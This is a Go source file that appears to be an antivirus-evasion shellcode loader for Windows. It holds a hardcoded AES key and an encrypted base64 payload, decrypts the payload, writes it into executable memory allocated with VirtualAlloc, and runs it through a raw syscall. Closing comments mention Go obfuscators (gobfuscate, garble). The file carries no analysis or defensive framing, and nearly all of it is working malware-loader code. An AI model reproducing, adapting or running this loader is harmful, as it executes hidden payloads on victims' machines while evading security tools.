package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func build(ddm string) {
	sDec, _ := base64.StdEncoding.DecodeString(ddm)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	syscall.Syscall(addr, 0, 0, 0, 0)

}

//填充字符串（末尾）
func PaddingText1(str []byte, blockSize int) []byte {
	//需要填充的数据长度
	paddingCount := blockSize - len(str)%blockSize
	//填充数据为：paddingCount ,填充的值为：paddingCount
	paddingStr := bytes.Repeat([]byte{byte(paddingCount)}, paddingCount)
	newPaddingStr := append(str, paddingStr...)
	//fmt.Println(newPaddingStr)
	return newPaddingStr
}

//去掉字符（末尾）
func UnPaddingText1(str []byte) []byte {
	n := len(str)
	count := int(str[n-1])
	newPaddingText := str[:n-count]
	return newPaddingText
}

//---------------DES加密  解密--------------------
func EncyptogAES(src, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(nil)
		return nil
	}
	src = PaddingText1(src, block.BlockSize())
	blockMode := cipher.NewCBCEncrypter(block, key)
	blockMode.CryptBlocks(src, src)
	return src

}

func DecrptogAES(src, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(nil)
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, key)
	blockMode.CryptBlocks(src, src)
	src = UnPaddingText1(src)
	return src
}

func main() {
	str := "32AuYl0m4fZpZcCKmLajjeUUeBkYss+jCrtqnh/T2LJoJZXu1euigZCSp1Oe/7saXYrBnHLbtrrUF/kJZHnlGOplhHZxJGok2f9grv+fF+gtuTa+1P8+IFxSnWTRrH1sjqAqi0OZa0HzoJ0mHe7LhxUPqaYxDn8bIHEQNK3wYEtsQVR/AfvHtH0cMMeXMKlTPT7aDuCE15lKzDlBSZQkC5p8DqVsW6ahVXKlyaWMDALkn6YRjZL4rYijsJ+qua6qZwrDvLQcCseFbeOHkR4d/swOV0mh1eDp8sphoLy25LoB/z2aoZF0osAofyKW2D+mWQYvjgOwRebwsVecOsN+GHwid97gUkMbk6bWhYXPkfGk1943gv4uHrDJ5FeCoQBoEbE65bX7GId7SAN9it54F7hK2AVszd3TvBbLzWQn5Ft3mQii1l4JdxKRJSuiuD7A3Sq1jqq8jinIzBqbE3ocBK5Mx6qAZ0BgOu4ISfZfvfOa5Mu4xrqGl+EImHcp/o1B5mTs464YW2/eDQZ3EDkGljBLZVXJNEHaD/KAL6RuKXyZl2UpxG+cW5jg7x5QL9B3lIBi8rrD0pqzj8DMvR+oUzAFZ3XOsPxB3ZnlRV44ONCGIvynFYeQhjpllujijexmnS9kqzt7UjD0XlBq5LrJGyOLBTlR+iCbahcRQxlMRQcJkI7LBet02vuKDc41Atq8WG1XKxHHMRQvU3rD96rjZRJFiO5BF0B6KG63zwARcnJYpH3QAa4cEcSNRpXShzyD4AhGvhmDXegni627FYa65hvF/y7PgyS79IJL9o/UpgQiV0roKF9xwLfEw/PPwKaGYkbPovsuA43BWDwjBwNHzzwucQS6nr5ljW8SYPYF9t2mla6baMjeAL4OEiRV40fm3tHgU0gzH3lvJdDLMeGMGA=="
	key := []byte("LeslieCheungKwok")
	base_byte, _ := base64.StdEncoding.DecodeString(str)
	build(string(DecrptogAES(base_byte, key)))
}

//go install github.com/unixpickle/gobfuscate@latest   不知道咋用
//go install mvdan.cc/garble@latest
